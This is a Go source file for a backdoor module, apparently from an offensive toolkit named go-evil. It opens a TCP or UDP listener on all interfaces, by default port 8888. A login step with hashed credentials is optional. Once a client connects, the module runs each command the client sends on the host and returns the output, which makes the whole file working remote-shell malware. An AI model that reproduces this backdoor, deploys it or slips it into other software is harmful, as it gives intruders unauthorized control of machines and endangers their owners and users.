package backdoor

import (
	"fmt"
	"net"
	"os/exec"
	"strings"

	attack_vector "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash"
	"github.com/s9rA16Bf4/go-evil/utility/converter"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

type backdoor_t struct {
	ip                string // This will be localhost
	port              string
	protocol          string       // TCP
	conn              net.Listener // The active connection
	read_size         int          // How many bits should be read
	login             bool         // Is a login required to login, default is false
	username          string       // Username to login
	password          string       // Password to login
	welcome_msg       string       // Message to print when you connect
	hashing_algorithm string       // Which hashing algorithm to utilize
}

var c_back backdoor_t

func Set_port(new_port string) {
	converter.String_to_int(new_port, "backdoor.Set_port()") // Will also check if the new port is an actual int
	c_back.port = new_port
}

func Enable_login() {
	c_back.login = true
}
func Disable_login() {
	c_back.login = false
}

func Set_username(username string) {
	c_back.username = username
}
func Set_password(password string) {
	c_back.password = password
}

func Set_protocol(new_proto string) {
	if new_proto != "tcp" && new_proto != "udp" {
		notify.Error("Unknown network protocol '"+new_proto+"'", "backdoor.Set_protocol")
	}

	c_back.protocol = new_proto
}

func Set_welcome_msg(new_msg string) {
	c_back.welcome_msg = new_msg + "\n"
}

func Set_hash(new_hash string) {
	c_back.hashing_algorithm = new_hash
}

func Set_read_size(new_size string) {
	value := converter.String_to_int(new_size, "backdoor.Set_read_size()")
	c_back.read_size = value
}

func Start() {
	c_back.ip = "0.0.0.0"

	if c_back.protocol == "" {
		Set_protocol("tcp")
	}
	if c_back.port == "" { // The port was never specified
		Set_port("8888")
	}
	if c_back.read_size == 0 {
		Set_read_size("1024")
	}
	conn, err := net.Listen(c_back.protocol, c_back.ip+":"+c_back.port)
	if err != nil {
		notify.Error(err.Error(), "backdoor.Start()")
	}
	c_back.conn = conn
	fmt.Println("Start")
}

func Close() {
	c_back.conn.Close()
}

func extract_login_credentials(in []byte) string {
	var toReturn string
	for _, c := range in {
		if c == 0 || c == 10 {
			break
		} else {
			toReturn += string(c)
		}
	}
	return toReturn
}

func Serve() {
	active_conn, err := c_back.conn.Accept() // accept any connection
	if err != nil {
		active_conn.Close() // Closes the connection
		Close()
		notify.Error(err.Error(), "backdoor.serve()")
	}
	if c_back.login { // We must authenticate the user
		for { // We will exit ony once a login is correct
			read := make([]byte, c_back.read_size)
			var user, pass string

			active_conn.Write([]byte("[1] Username: "))
			active_conn.Read(read) // Read the username
			if read[0] == 0 {
				//Serve() // Reset the connection
				return
			}
			user = extract_login_credentials(read)

			active_conn.Write([]byte("[2] Password: "))
			active_conn.Read(read) // Read the password
			pass = extract_login_credentials(read)

			// Hash the username and password
			attack_vector.Set_hash(c_back.hashing_algorithm)
			user = attack_vector.Hash(user)
			pass = attack_vector.Hash(pass)

			if user != c_back.username || pass != c_back.password {
				active_conn.Write([]byte("[!] Invalid username and/or password\n"))
			} else { // The provided info was correct
				break
			}
		}
	}

	active_conn.Write([]byte(c_back.welcome_msg)) // Welcome the user
	for {                                         // A user connected
		active_conn.Write([]byte(">> "))
		read_data := make([]byte, c_back.read_size)
		active_conn.Read(read_data)
		if read_data[0] == 0 { // The user disconnected so exit this function
			return
		}

		var command string
		var args string
		var first_space bool // First space splits the command and the arguments
		// This portion reads the read data and splits it up to what it belives is the command and the command args (if there is any)
		for _, c := range read_data {
			if c == 0 || c == 10 { // 0 = empty data, 10 = New line
				break
			}
			if c == 32 && !first_space { // 32 = Space
				first_space = true
			} else {
				if !first_space {
					command += string(c)
				} else {
					args += string(c)
				}
			}
		}
		var toReturn []byte
		if command == "" { // Nothing was most likely entered
			toReturn = append(toReturn, []byte("No command was entered\n")...)
		} else {
			if args != "" {
				toReturn, err = exec.Command(command, strings.Split(args, " ")...).Output()
			} else {
				toReturn, err = exec.Command(command).Output()
			}
			if err != nil {
				toReturn = append(toReturn, []byte(err.Error())...)
				toReturn = append(toReturn, []byte("\n")...)
			}
		}
		active_conn.Write([]byte(toReturn)) // Send the output back to the user
	}
}
